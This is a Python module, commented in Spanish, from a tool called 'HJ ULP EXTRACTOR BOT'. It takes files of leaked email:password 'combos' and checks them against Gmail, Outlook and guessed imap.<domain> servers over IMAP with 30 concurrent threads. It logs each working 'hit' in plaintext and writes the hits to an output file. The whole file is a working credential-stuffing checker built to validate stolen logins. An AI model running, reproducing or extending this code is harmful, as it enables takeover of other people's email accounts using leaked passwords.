"""
═══════════════════════════════════════════════════════════════
  HJ ULP EXTRACTOR BOT — IMAP Checker Module
═══════════════════════════════════════════════════════════════
  • Chequea combos mail:pass vía IMAP SSL
  • Detecta tipo: gmail, outlook, hosting
  • Retorna solo hits en formato mail:pass
  • Concurrencia controlada con ThreadPoolExecutor
═══════════════════════════════════════════════════════════════
"""

import imaplib
import threading
import time
from pathlib import Path
from typing import List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

from logger_setup import logger

# Timeout por conexión IMAP (NO usar socket.setdefaulttimeout — es global)
IMAP_TIMEOUT = 10

# Máximo de hilos concurrentes para IMAP
MAX_IMAP_WORKERS = 30

# Lock para escritura thread-safe
_write_lock = threading.Lock()


def _detectar_tipo(correo: str) -> str:
    """Detectar tipo de correo según dominio.
    Sin DNS lookup — solo clasificación por dominio conocido.
    Los demás se tratan como hosting y se intenta imap.<domain>.
    """
    try:
        dominio = correo.split("@")[1].lower()
    except (IndexError, AttributeError):
        return "desconocido"

    if dominio in ("gmail.com", "googlemail.com"):
        return "gmail"
    if dominio in ("hotmail.com", "outlook.com", "live.com", "msn.com"):
        return "outlook"
    # Todo lo demás: hosting — se intentará imap.<domain>
    return "hosting"


def _servidor_imap(tipo: str, dominio: str) -> str:
    """Obtener servidor IMAP según tipo."""
    if tipo == "gmail":
        return "imap.gmail.com"
    if tipo == "outlook":
        return "outlook.office365.com"
    if tipo == "hosting":
        return "imap." + dominio
    return "mail." + dominio


def _check_single(email: str, password: str) -> Tuple[bool, str, str]:
    """Chequear un solo login IMAP. Retorna (ok, tipo, server)."""
    try:
        dominio = email.split("@")[1]
    except (IndexError, AttributeError):
        return False, "invalid", ""

    tipo = _detectar_tipo(email)
    imap_server = _servidor_imap(tipo, dominio)

    try:
        # Timeout por conexión, NO global
        imap = imaplib.IMAP4_SSL(imap_server, 993, timeout=IMAP_TIMEOUT)
        imap.login(email, password)
        imap.select("INBOX")
        imap.logout()
        return True, tipo, imap_server
    except Exception:
        return False, tipo, imap_server


def _worker(combo: str) -> Optional[str]:
    """Procesar un combo mail:pass. Retorna el combo si es hit, None si no."""
    if ":" not in combo:
        return None

    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()

    if not email or not password or "@" not in email:
        return None

    ok, tipo, server = _check_single(email, password)
    if ok:
        logger.info(f"[IMAP] HIT | {email}:{password} | {tipo.upper()} | {server}")
        return f"{email}:{password}"

    return None


def imap_check_file(input_path: Path, output_path: Path, progress_callback=None) -> dict:
    """Chequear archivo de combos vía IMAP con concurrencia controlada.

    Args:
        input_path: Archivo .txt con combos mail:pass
        output_path: Archivo de salida para hits
        progress_callback: Función llamada con (checked, total, hits)

    Returns:
        dict con stats: total, hits, bads, elapsed
    """
    # Leer combos
    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ":" in line.strip()]

    total = len(combos)
    if total == 0:
        return {"total": 0, "hits": 0, "bads": 0, "elapsed": 0}

    hits_list = []
    checked = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_IMAP_WORKERS, thread_name_prefix="imap") as executor:
        future_to_combo = {
            executor.submit(_worker, combo): combo
            for combo in combos
        }

        for future in as_completed(future_to_combo):
            try:
                result = future.result()
                if result:
                    hits_list.append(result)
            except Exception:
                pass

            with _write_lock:
                checked += 1

            # Callback de progreso cada 3 combos (más frecuente para mejor UX)
            if progress_callback and checked % 3 == 0:
                try:
                    progress_callback(checked, total, len(hits_list))
                except Exception:
                    pass

    # Escribir hits
    with open(output_path, 'w', encoding='utf-8', buffering=1024*64) as f:
        f.write('\n'.join(hits_list))

    elapsed = time.time() - start_time
    stats = {
        "total": total,
        "hits": len(hits_list),
        "bads": total - len(hits_list),
        "elapsed": elapsed
    }

    logger.info(f"[IMAP] Check finalizado: {stats['hits']} hits de {stats['total']} en {elapsed:.1f}s")
    return stats
